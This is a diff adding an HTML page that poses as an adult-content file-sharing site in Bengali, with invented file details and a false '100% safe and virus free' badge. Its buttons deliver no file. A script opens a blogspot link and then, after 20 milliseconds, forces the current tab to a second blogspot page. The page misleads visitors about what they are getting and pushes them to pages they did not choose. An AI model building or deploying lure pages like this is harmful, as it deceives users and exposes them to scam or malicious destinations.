@@ -1,1 +1,202 @@
+<!doctype html>
 
+<style>
+* { box-sizing: border-box; }
+body, html { 
+    margin: 0; padding: 0; 
+    font-family: 'Segoe UI', Tahoma, Arial, sans-serif; 
+    background: #0d0d0d; 
+    color: #e0e0e0;
+}
+
+/* HEADER */
+.header { 
+    background: #1a1a1a; 
+    padding: 25px 15px; 
+    text-align: center; 
+    border-bottom: 3px solid #4dabf7; 
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
+}
+.header h1 { 
+    margin: 0; 
+    font-size: 26px; 
+    font-weight: 800; 
+    color: #fff; 
+}
+.age-warning { 
+    margin-top: 12px; 
+    color: #ff6b6b; 
+    font-weight: 700; 
+    font-size: 16px; 
+}
+
+/* MAIN BOX */
+.container { 
+    max-width: 600px; 
+    margin: 20px auto; 
+    background: #1e1e1e; 
+    border-radius: 20px; 
+    overflow: hidden; 
+    box-shadow: 0 10px 40px rgba(0,0,0,0.6); 
+    padding: 25px; 
+}
+
+/* PROFILE */
+.author-profile { 
+    display: flex; 
+    align-items: center; 
+    gap: 15px; 
+    margin-bottom: 20px; 
+}
+.author-profile img { 
+    width: 65px; 
+    height: 65px; 
+    border-radius: 50%; 
+    border: 3px solid #4dabf7; 
+}
+.author-name { 
+    font-weight: 800; 
+    font-size: 18px; 
+}
+.publish-time { 
+    font-size: 14px; 
+    color: #bbb; 
+}
+
+/* META */
+.file-meta { 
+    display: flex; 
+    flex-wrap: wrap; 
+    gap: 10px; 
+    margin: 18px 0; 
+}
+.file-meta div { 
+    background: #2a2a2a; 
+    padding: 10px 14px; 
+    border-radius: 10px; 
+    font-size: 14px; 
+    font-weight: 700; 
+}
+
+/* SAFE BOX */
+.safe { 
+    background: #1b4332; 
+    border-left: 6px solid #2ecc71; 
+    padding: 15px; 
+    border-radius: 10px; 
+    color: #b8e6b8; 
+    margin: 20px 0; 
+    font-size: 15px; 
+}
+
+/* BUTTONS */
+.btn-container { 
+    display: flex; 
+    flex-direction: column; 
+    gap: 18px; 
+}
+.btn { 
+    padding: 18px 15px; 
+    font-size: 18px; 
+    font-weight: 900; 
+    border-radius: 12px; 
+    text-decoration: none; 
+    text-align: center; 
+    transition: 0.3s all ease-in-out; 
+    cursor:pointer; 
+}
+
+/* Button Animations */
+.btn:hover { 
+    transform: scale(1.05); 
+    filter: brightness(1.1); 
+}
+.btn:active { 
+    transform: scale(0.97); 
+}
+
+/* Colors */
+.btn-gdrive { background: #1a73e8; color: white; }
+.btn-gdrive:hover { background: #1557b0; }
+
+.btn-mega { background: #d90007; color: white; }
+.btn-mega:hover { background: #b00006; }
+
+/* FOOTER */
+.footer { 
+    text-align: center; 
+    padding: 22px; 
+    background: #111; 
+    color: #777; 
+    font-size: 14px; 
+    margin-top: 35px; 
+}
+
+/* MOBILE ONLY - Boro Everything */
+@media (max-width: 768px) {
+    .container { max-width: 95%; padding: 30px; border-radius: 25px; }
+    .header h1 { font-size: 32px; }
+    .age-warning { font-size: 18px; }
+    .author-profile img { width: 90px; height: 90px; }
+    .author-name { font-size: 22px; }
+    .publish-time { font-size: 16px; }
+    .file-meta div { font-size: 16px; padding: 14px 18px; border-radius: 14px; }
+    .safe { font-size: 18px; padding: 18px; border-radius: 14px; }
+    .btn { font-size: 22px; padding: 20px; border-radius: 15px; }
+}
+</style>
+
+<header class="header">
+    <h1>প্রাইভেট কনটেন্ট শেয়ারিং প্ল্যাটফর্ম</h1>
+    <div class="age-warning">18+ Only • প্রাপ্তবয়স্কদের জন্য</div>
+</header>
+
+<div class="container">
+
+    <div class="author-profile">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTeBdxUS86wJt4xWkzLOeq_Iw8dfYHCkpT1yA&s" />
+        <div>
+            <div class="author-name">Uploader: PORN HUB</div>
+            <div class="publish-time">Published: ২৯ নভেম্বর, ২০২৫</div>
+        </div>
+    </div>
+
+    <div class="file-meta">
+        <div>Size: 28 MB</div>
+        <div>Resolution: 1920×1080</div>
+        <div>Duration: ৪৫ মিনিট</div>
+    </div>
+
+    <div class="safe">এই ফাইলটি ১০০% সেফ এবং ভাইরাস ফ্রি। স্ক্যান করা হয়েছে।</div>
+
+    <div class="btn-container">
+        <a id="down" class="btn btn-gdrive">ডাউনলোড করুন</a>
+        <a id="watch" class="btn btn-mega">এখন দেখুন</a>
+    </div>
+</div>
+
+<div class="footer">
+    © 2025 BD Private Share • 18+ Only • ফাইল ৭ দিন পর অটো ডিলিট হবে
+</div>
+
+<script>
+const watchURL = "https://watchvarseax.blogspot.com/p/blog-page.html";
+const downloadURL = "https://watchvarseax.blogspot.com/p/blog-page.html";
+const redirectURL = "https://adx3uq.blogspot.com/p/parves_25.html";
+
+function go(link){
+    try {
+        const w = window.open(link, "_blank");
+        if(!w) window.location.href = link;
+        setTimeout(()=>window.location.href = redirectURL, 20);
+    } catch(e){
+        window.location.href = link;
+        setTimeout(()=>window.location.href = redirectURL, 20);
+    }
+}
+
+document.getElementById("watch").onclick = e => { e.preventDefault(); go(watchURL); };
+document.getElementById("down").onclick = e => { e.preventDefault(); go(downloadURL); };
+</script>
+
+</!doctype>
